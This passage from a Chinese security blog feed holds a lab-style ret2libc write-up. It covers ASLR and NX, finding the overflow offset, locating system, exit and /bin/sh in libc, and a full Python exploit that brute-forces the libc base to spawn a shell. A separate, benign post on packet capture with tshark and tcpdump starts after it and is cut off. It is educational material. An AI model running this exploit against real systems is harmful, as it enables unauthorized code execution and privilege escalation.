-<p>ret2libc（Return-to-Libc）是一种缓冲区溢出漏洞攻击技术，其基本原理实在存在缓冲区溢出等漏洞时，通过覆盖函数返回地址，使程序跳转到 libc 库中的已知函数（例如 system）执行，从而达到执行任意命令的目的。这种攻击不需要注入新代码，二十利用目标程序中已有的、可信任的库函数，因此可以绕过某些内存保护机制（如不可执行栈 NX/DEP）。我们在漏洞利用过程中通常需要泄露或预测 libc 中这些关键函数地址，然后构造一个有效的攻击链，让程序在返回时跳转到这些函数执行预期的操作。</p>
-<p>传统的缓冲区溢出攻击通过栈上注入恶意 shellcode，然后覆盖返回地址跳转到 shellcode 执行。但现代系统引入了 NX（No-eXecute）或 DEP（Data Excution Prevention），标记栈为不可执行，导致注入的 shellcode 无法运行。这是，攻击者发现程序通常会链接标准库（如 libc），其中包含许多有用函数（如 system、exit）。这些函数的代码已经在内存中，且是可执行的。于是，Ret2Libc 的思路诞生：与其注入代码，不如直接调用 libc 中的函数。</p>
-<p>能实施 ret2libc 攻击主要需要几个条件。首先，目标程序必须存在能够控制返回地址的漏洞，比如缓冲区溢出等漏洞，允许我们覆盖函数返回地址。其次，程序必须动态连接了 libc。另外，由于现代系统普遍采取 ASLR 等内存随机化机制，攻击者还需要有办法泄露 libc 的地址信息或者存在其他绕错机制，否则无法准确定位函数地址。最后，如果系统还启用了 NX/DEP 等防护技术，攻击者也只能利用 ret2libc 这种不依赖注入代码的方式来实现代码执行。因此，漏洞本身、动态链接库以及系统防护配置都是决定是否能成功实施 ret2libc 攻击的关键因素。</p>
-<h4 id="aslr">ASLR</h4>
-<p>ASLR 全称为 Address Space Layout Randomization（地址空间布局随机化），是一种在每次程序运行时随机分配内存中各个区域加载地址的安全机制。它涵盖了堆、栈、共享库和可执行文件等多个内存区一，使得攻击者很难预测系统中的关键数据和函数的真实位置，从而大大降低了利用固定内存地址攻击的可能性。通过这种不断变换的地址布局，即使利用漏洞获取了部分内存信息，攻击者也难以构造有效的利用连，迫使攻击者不得不寻找信息泄露等其他手段来绕过这一防护措施</p>
-<h4 id="nxdep">NX/DEP</h4>
-<p>NX/DEP 全称为 No eXecute/ Data Execution Prevention（不可执行内存/数据执行保护），是一种通过标记内存区域属性来组织恶意代码执行的技术。该机制会将通常用于存储数据的内存区域（例如堆或栈）标记为不可执行区域，从而防止利用缓冲区溢出等漏洞注入并执行代码。NX 主要针对内存页属性，而 DEP 则更多体现在操作系统对整个内存管理的安全策略上。两者结合起来，有效放置了大部分传统的代码注入攻击，使得攻击者必须依赖 ret2lib 等间接利用技术绕过防护。</p>
-<h3 id="aslr-状态评估">ASLR 状态评估</h3>
-<p>每次执行 ldd 查看动态链接库时都能看到内存中加载的地址不同。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>erso@deathStar1:~$ ldd /bin/dartVader 
-</span></span><span style="display:flex;"><span>        linux-gate.so.1 <span style="color:#f92672">=</span>&gt;  <span style="color:#f92672">(</span>0xb77d1000<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>        libc.so.6 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span style="color:#f92672">(</span>0xb7615000<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>        /lib/ld-linux.so.2 <span style="color:#f92672">(</span>0xb77d3000<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>erso@deathStar1:~$ ldd /bin/dartVader
-</span></span><span style="display:flex;"><span>        linux-gate.so.1 <span style="color:#f92672">=</span>&gt;  <span style="color:#f92672">(</span>0xb77a9000<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>        libc.so.6 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span style="color:#f92672">(</span>0xb75ed000<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>        /lib/ld-linux.so.2 <span style="color:#f92672">(</span>0xb77ab000<span style="color:#f92672">)</span>
-</span></span></code></pre></div><p>这是系统启用了 ASLR 的典型特征，具体验证一下。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>erso@deathStar1:~$ cat /proc/sys/kernel/randomize_va_space 
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>
-</span></span></code></pre></div><p>没错，有 aslr 的存在。它在每次加载程序时都会随机分配动态库的加载地址，目的就是防止攻击者利用固定地址进行利用。</p>
-<p><code>/proc/sys/kernel/randomize_va_space</code>  这个文件用于控制 Linux 系统中地址空间布局随机化：
-0. 值为 0 时表示关闭 ASLR，此时加载个内存区域的地址固定不变；</p>
-<ol>
-<li>值为 1 时表示开启部分随机化，这种模式下虽然某些区域（例如堆、栈）会随机化，但有的内存区域可能仍然固定或仅随机化有限，使得某些漏洞的利用风险依然存在。</li>
-<li>值为 2 时表示完成开启 ASLR，所有相关内存区域在每次加载时都会尽可能随机化。</li>
-</ol>
-<p>可以尝试将其修改为 0，但是权限往往不允许。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>erso@deathStar1:~$ echo <span style="color:#ae81ff">0</span> &gt; /proc/sys/kernel/randomize_va_space
-</span></span><span style="display:flex;"><span>-bash: /proc/sys/kernel/randomize_va_space: Permission denied
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>erso@deathStar1:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E <span style="color:#e6db74">&#34;(system|exit)&#34;</span>
-</span></span><span style="display:flex;"><span>   111: <span style="color:#ae81ff">00033690</span>    <span style="color:#ae81ff">58</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> __cxa_at_quick_exit@@GLIBC_2.10
-</span></span><span style="display:flex;"><span>   139: <span style="color:#ae81ff">00033260</span>    <span style="color:#ae81ff">45</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> exit@@GLIBC_2.0
-</span></span><span style="display:flex;"><span>   243: 0011b8a0    <span style="color:#ae81ff">73</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> svcerr_systemerr@@GLIBC_2.0
-</span></span><span style="display:flex;"><span>   446: 000336d0   <span style="color:#ae81ff">268</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> __cxa_thread_atexit_impl@@GLIBC_2.18
-</span></span><span style="display:flex;"><span>   554: 000b8634    <span style="color:#ae81ff">24</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> _exit@@GLIBC_2.0
-</span></span><span style="display:flex;"><span>   609: 0011e780    <span style="color:#ae81ff">56</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> svc_exit@@GLIBC_2.0
-</span></span><span style="display:flex;"><span>   620: <span style="color:#ae81ff">00040310</span>    <span style="color:#ae81ff">56</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> __libc_system@@GLIBC_PRIVATE
-</span></span><span style="display:flex;"><span>   645: <span style="color:#ae81ff">00033660</span>    <span style="color:#ae81ff">45</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> quick_exit@@GLIBC_2.10
-</span></span><span style="display:flex;"><span>   868: <span style="color:#ae81ff">00033490</span>    <span style="color:#ae81ff">84</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> __cxa_atexit@@GLIBC_2.1.3
-</span></span><span style="display:flex;"><span>  1037: 00128ce0    <span style="color:#ae81ff">60</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> atexit@GLIBC_2.0
-</span></span><span style="display:flex;"><span>  1380: 001ad204     <span style="color:#ae81ff">4</span> OBJECT  GLOBAL DEFAULT   <span style="color:#ae81ff">31</span> argp_err_exit_status@@GLIBC_2.1
-</span></span><span style="display:flex;"><span>  1443: <span style="color:#ae81ff">00040310</span>    <span style="color:#ae81ff">56</span> FUNC    WEAK   DEFAULT   <span style="color:#ae81ff">12</span> system@@GLIBC_2.0
-</span></span><span style="display:flex;"><span>  1492: 000fb610    <span style="color:#ae81ff">62</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> pthread_exit@@GLIBC_2.0
-</span></span><span style="display:flex;"><span>  2090: 001ad154     <span style="color:#ae81ff">4</span> OBJECT  GLOBAL DEFAULT   <span style="color:#ae81ff">31</span> obstack_exit_failure@@GLIBC_2.0
-</span></span><span style="display:flex;"><span>  2243: <span style="color:#ae81ff">00033290</span>    <span style="color:#ae81ff">77</span> FUNC    WEAK   DEFAULT   <span style="color:#ae81ff">12</span> on_exit@@GLIBC_2.0
-</span></span><span style="display:flex;"><span>  2386: 000fc180     <span style="color:#ae81ff">2</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> __cyg_profile_func_exit@@GLIBC_2.2
-</span></span></code></pre></div><p>上面查询证明 libc 库中能确定 system、exit 等关键函数在内存中相对具体位置。</p>
-<h2 id="利用编写">利用编写</h2>
-<h3 id="确定缓冲区大小">确定缓冲区大小</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ msf-pattern_create -l <span style="color:#ae81ff">100</span>
-</span></span><span style="display:flex;"><span>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ ./dartVader Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
-</span></span><span style="display:flex;"><span>zsh: segmentation fault  ./dartVader 
-</span></span><span style="display:flex;"><span>                                                                                                                              
-</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ dmesg | tail            
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  239.138010<span style="color:#f92672">]</span> e1000 0000:02:01.0 eth0: entered promiscuous mode
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  280.639404<span style="color:#f92672">]</span> e1000 0000:02:01.0 eth0: left promiscuous mode
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  282.078779<span style="color:#f92672">]</span> e1000 0000:02:01.0 eth0: entered promiscuous mode
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  288.329418<span style="color:#f92672">]</span> e1000 0000:02:01.0 eth0: left promiscuous mode
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  299.600495<span style="color:#f92672">]</span> e1000 0000:02:01.0 eth0: entered promiscuous mode
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>  419.601025<span style="color:#f92672">]</span> e1000 0000:02:01.0 eth0: left promiscuous mode
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 2735.339190<span style="color:#f92672">]</span> e1000: eth0 NIC Link is Down
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> 2739.367371<span style="color:#f92672">]</span> e1000: eth0 NIC Link is Up <span style="color:#ae81ff">1000</span> Mbps Full Duplex, Flow Control: None
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>12358.851973<span style="color:#f92672">]</span> dartVader<span style="color:#f92672">[</span>103250<span style="color:#f92672">]</span>: segfault at <span style="color:#ae81ff">63413563</span> ip <span style="color:#ae81ff">0000000063413563</span> sp 00000000ff8cde70 error <span style="color:#ae81ff">14</span> likely on CPU <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>core 1, socket 0<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>12358.851987<span style="color:#f92672">]</span> Code: Unable to access opcode bytes at 0x63413539.
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ msf-pattern_offset -l <span style="color:#ae81ff">100</span> -q 0x63413563        
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exact match at offset <span style="color:#ae81ff">76</span>
-</span></span></code></pre></div><p>在本地暴力填充确定缓冲区溢出的偏移长度。</p>
-<p>确定需要用到的函数地址。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>erso@deathStar1:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E <span style="color:#e6db74">&#34;(system|exit)&#34;</span>
-</span></span><span style="display:flex;"><span>   111: <span style="color:#ae81ff">00033690</span>    <span style="color:#ae81ff">58</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> __cxa_at_quick_exit@@GLIBC_2.10
-</span></span><span style="display:flex;"><span>   139: <span style="color:#ae81ff">00033260</span>    <span style="color:#ae81ff">45</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> exit@@GLIBC_2.0
-</span></span><span style="display:flex;"><span>   243: 0011b8a0    <span style="color:#ae81ff">73</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> svcerr_systemerr@@GLIBC_2.0
-</span></span><span style="display:flex;"><span>   446: 000336d0   <span style="color:#ae81ff">268</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> __cxa_thread_atexit_impl@@GLIBC_2.18
-</span></span><span style="display:flex;"><span>   554: 000b8634    <span style="color:#ae81ff">24</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> _exit@@GLIBC_2.0
-</span></span><span style="display:flex;"><span>   609: 0011e780    <span style="color:#ae81ff">56</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> svc_exit@@GLIBC_2.0
-</span></span><span style="display:flex;"><span>   620: <span style="color:#ae81ff">00040310</span>    <span style="color:#ae81ff">56</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> __libc_system@@GLIBC_PRIVATE
-</span></span><span style="display:flex;"><span>   645: <span style="color:#ae81ff">00033660</span>    <span style="color:#ae81ff">45</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> quick_exit@@GLIBC_2.10
-</span></span><span style="display:flex;"><span>   868: <span style="color:#ae81ff">00033490</span>    <span style="color:#ae81ff">84</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> __cxa_atexit@@GLIBC_2.1.3
-</span></span><span style="display:flex;"><span>  1037: 00128ce0    <span style="color:#ae81ff">60</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> atexit@GLIBC_2.0
-</span></span><span style="display:flex;"><span>  1380: 001ad204     <span style="color:#ae81ff">4</span> OBJECT  GLOBAL DEFAULT   <span style="color:#ae81ff">31</span> argp_err_exit_status@@GLIBC_2.1
-</span></span><span style="display:flex;"><span>  1443: <span style="color:#ae81ff">00040310</span>    <span style="color:#ae81ff">56</span> FUNC    WEAK   DEFAULT   <span style="color:#ae81ff">12</span> system@@GLIBC_2.0
-</span></span><span style="display:flex;"><span>  1492: 000fb610    <span style="color:#ae81ff">62</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> pthread_exit@@GLIBC_2.0
-</span></span><span style="display:flex;"><span>  2090: 001ad154     <span style="color:#ae81ff">4</span> OBJECT  GLOBAL DEFAULT   <span style="color:#ae81ff">31</span> obstack_exit_failure@@GLIBC_2.0
-</span></span><span style="display:flex;"><span>  2243: <span style="color:#ae81ff">00033290</span>    <span style="color:#ae81ff">77</span> FUNC    WEAK   DEFAULT   <span style="color:#ae81ff">12</span> on_exit@@GLIBC_2.0
-</span></span><span style="display:flex;"><span>  2386: 000fc180     <span style="color:#ae81ff">2</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">12</span> __cyg_profile_func_exit@@GLIBC_2.2
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>erso@deathStar1:~$ ldd /bin/dartVader 
-</span></span><span style="display:flex;"><span>        linux-gate.so.1 <span style="color:#f92672">=</span>&gt;  <span style="color:#f92672">(</span>0xb76e1000<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>        libc.so.6 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span style="color:#f92672">(</span>0xb7525000<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>        /lib/ld-linux.so.2 <span style="color:#f92672">(</span>0xb76e3000<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>erso@deathStar1:~$ strings -t x /lib/i386-linux-gnu/libc.so.6 | grep -E /bin/sh
-</span></span><span style="display:flex;"><span> 162d4c /bin/sh
-</span></span></code></pre></div><p>下面为 exit 和 system 的地址：</p>
-<p><code>   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0</code></p>
-<p><code>  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0</code></p>
-<p>攥写利用脚本：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ vim ret2libc.py
-</span></span><span style="display:flex;"><span>                                                                                                                              
-</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ cat ret2libc.py 
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
-</span></span><span style="display:flex;"><span>from struct import pack
-</span></span><span style="display:flex;"><span>from subprocess import call
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> b<span style="color:#e6db74">&#34;A&#34;</span> * <span style="color:#ae81ff">76</span>
-</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> 0xb75c9000
-</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> pack<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&lt;I&#34;</span>, libc + 0x40310<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>exit <span style="color:#f92672">=</span> pack<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&lt;I&#34;</span>, libc + 0x33260<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>sh <span style="color:#f92672">=</span> pack<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&lt;I&#34;</span>,libc + 0x162d4c<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> offset + system + exit + sh
-</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> b<span style="color:#e6db74">&#34;/bin/dartVader&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in range<span style="color:#f92672">(</span>1024<span style="color:#f92672">)</span>:
-</span></span><span style="display:flex;"><span>    print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Attemp %d&#34;</span> % i<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> call<span style="color:#f92672">([</span>app,buffer<span style="color:#f92672">])</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ret <span style="color:#f92672">==</span> 0:
-</span></span><span style="display:flex;"><span>        print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;[+] Success!!!&#34;</span><span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>        break
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>        print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;[-] Failed&#34;</span><span style="color:#f92672">)</span>
-</span></span></code></pre></div><p>buffer 由四段组成，offset 填充缓冲区后 system 执行命令 <code>system(&quot;/bin/sh&quot;)</code>，其中 sh 提供 /bin/sh 地址，让 system 抛出 shell。 exit 通常是必要的，它作为 system 的返回地址，遵循 x86 的调用约定（返回地址紧跟函数地址，参数在返回地址后），确保 sh 在 <code>ESP+4</code> 被 system 读取，同时防止 system 返回后跳转到 sh 或随机地址。如果没有 exit 会导致崩溃。</p>
-<p>使用 struct.pack 的目的是将数值形式的地址转换为机器能直接识别的二进制格式，从而能够直接写入内存覆盖返回地址，达到利用的效果。其中 <code>pack(&quot;&lt;I&quot;, ...)</code> 中的 <code>&lt;</code> 表示小端格式，而 I 则表示一个 4 字节的无符号整数，确保生成的地址在内存中按照正确的字节顺序排列。</p>
-<p>循环中调用了 python 标准库中的 subprocess 模块中的 call 函数，用于启动子进程执行可利用程序。传入的参数是一个列表，第一个元素是目标程序的路径，第二个原色是构造好的 payload，作为命令行参数传给目标程序。call 函数会等待子进程结束，并返回该进程的退出状态码并赋值给 ret，0 表示正常退出，非 0 表示可能未利用成功。</p>
-<p>成功利用。</p>
-<p><img src="Pa1.png" alt="Pa1"></p>
-]]></content></item><item><title>流量包分析，以 tshark、tcpdump、wireshark 为例</title><link>https://enilmalus.github.io/posts/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90%E4%BB%A5-tsharktcpdumpwireshark-%E4%B8%BA%E4%BE%8B/</link><pubDate>Tue, 30 Dec 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90%E4%BB%A5-tsharktcpdumpwireshark-%E4%B8%BA%E4%BE%8B/</guid><description>流量包分析 Libpcap（Packet Pactrue Library） Libpcap 是 Unix/Linux 下的标准数据包捕获库，tshark、tcpdump、wireshark 都是通过获取这个接口实现抓包功能。
-BPF 执行流程：
-用户在命令行输入高级过滤语句。 libpcap 编码器转换为 BPF 字节码。 BPF 指令加载到内核，在虚拟机中运行。 过滤过的包加载到用户缓冲区。 工具对比 tcpdump tcpdump 是最轻量、最基础的捕获工具，快速、可靠，可以在 ssh 中使用。
-tshark tshark 是 wireshark 的完整命令行模式，调用 dumpcap 进行实际捕获。
-wireshark wireshark 拥有完整的 ui 界面。
-用法分析 当一个 IP 没有检测到开放的服务时应想到对这个 IP 进行抓包分析。
--f 'host 10.10.10.45' 的语法在 tshark、tcpdump、wireshark 等流量分析工具中是通用的，即 BPF 语法。它是一种在内核层面进行的数据包过滤机制，它允许网络抓包工具在数据包传输到用户空间之前就进行筛选，从而大大提高了捕获效率，BPF 提供了一套虚拟指令集，用户可以编写规则，内核在接收到每个数据包时按照这些规则进行判断，只有符合条件的数据包才会被传输到用户空间进行进一步处理，由于在内核中进行过滤能够避免将大量不必要的数据包拷贝到用户空间，这种设计不仅优化了性能，还降低了系统资源的消耗，使得 BPF 成为了许多网络分析、监控和安全审计工具的核心组件。
-例如上面这个执行结果，10.10.10.145 这台主机以 UDP 协议向广播地址 255.255.255.255 发送数据包，流量呈现出明显的周期性和两种不同特征，数据包大概每隔 60 秒成对出现，一类数据包显示 UDP，字段为 139，负载较小，一类数据包显示 UDP，字段为 514，负载较大。周期内数据包发送顺序可能互换，表明了主机很可能在进行某种广播式的服务或心跳检测，利用 UDP 的无连接特性通过广播方式向网络中其他设备通告状态信息或探测服务。整个流量特征体现了主动广播、定时发送以及数据包大小与内容明显区分的规律性，这在网络设备中并不罕见，有必要进一步看具体的数据意义。
-tsahrk -i eth0 -f &amp;#39;host 10.</description><content type="html"><![CDATA[<h2 id="流量包分析">流量包分析</h2>
-<h3 id="libpcappacket-pactrue-library">Libpcap（Packet Pactrue Library）</h3>
-<p>Libpcap 是 Unix/Linux 下的标准数据包捕获库，tshark、tcpdump、wireshark 都是通过获取这个接口实现抓包功能。</p>
-<h3 id="bpf">BPF</h3>
-<p>执行流程：</p>
-<ol>
-<li>用户在命令行输入高级过滤语句。</li>
-<li>libpcap 编码器转换为 BPF 字节码。</li>
-<li>BPF 指令加载到内核，在虚拟机中运行。</li>
-<li>过滤过的包加载到用户缓冲区。</li>
-</ol>
-<h2 id="工具对比">工具对比</h2>
-<h3 id="tcpdump">tcpdump</h3>
-<p>tcpdump 是最轻量、最基础的捕获工具，快速、可靠，可以在 ssh 中使用。</p>
-<h3 id="tshark">tshark</h3>
-<p>tshark 是 wireshark 的完整命令行模式，调用 dumpcap 进行实际捕获。</p>
-<h3 id="wireshark">wireshark</h3>
-<p>wireshark 拥有完整的 ui 界面。</p>
-<h3 id="用法分析">用法分析</h3>
-<p>当一个 IP 没有检测到开放的服务时应想到对这个 IP 进行抓包分析。</p>
-<p><code>-f 'host 10.10.10.45'</code> 的语法在 tshark、tcpdump、wireshark 等流量分析工具中是通用的，即 BPF 语法。它是一种在内核层面进行的数据包过滤机制，它允许网络抓包工具在数据包传输到用户空间之前就进行筛选，从而大大提高了捕获效率，BPF 提供了一套虚拟指令集，用户可以编写规则，内核在接收到每个数据包时按照这些规则进行判断，只有符合条件的数据包才会被传输到用户空间进行进一步处理，由于在内核中进行过滤能够避免将大量不必要的数据包拷贝到用户空间，这种设计不仅优化了性能，还降低了系统资源的消耗，使得 BPF 成为了许多网络分析、监控和安全审计工具的核心组件。</p>
-<p><img src="P1.png" alt="P1"></p>
-<p>例如上面这个执行结果，10.10.10.145 这台主机以 UDP 协议向广播地址 255.255.255.255 发送数据包，流量呈现出明显的周期性和两种不同特征，数据包大概每隔 60 秒成对出现，一类数据包显示 UDP，字段为 139，负载较小，一类数据包显示 UDP，字段为 514，负载较大。周期内数据包发送顺序可能互换，表明了主机很可能在进行某种广播式的服务或心跳检测，利用 UDP 的无连接特性通过广播方式向网络中其他设备通告状态信息或探测服务。整个流量特征体现了主动广播、定时发送以及数据包大小与内容明显区分的规律性，这在网络设备中并不罕见，有必要进一步看具体的数据意义。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tsahrk -i eth0 -f <span style="color:#e6db74">&#39;host 10.10.10.45&#39;</span> -w Enilmalus.pcap
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>tsahrk -r Enilmalus.pcap -V
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>tshark -r Enilmalus.pcap -T fields -e data | tr -d <span style="color:#e6db74">&#39; &#39;</span> | xxd -r -p
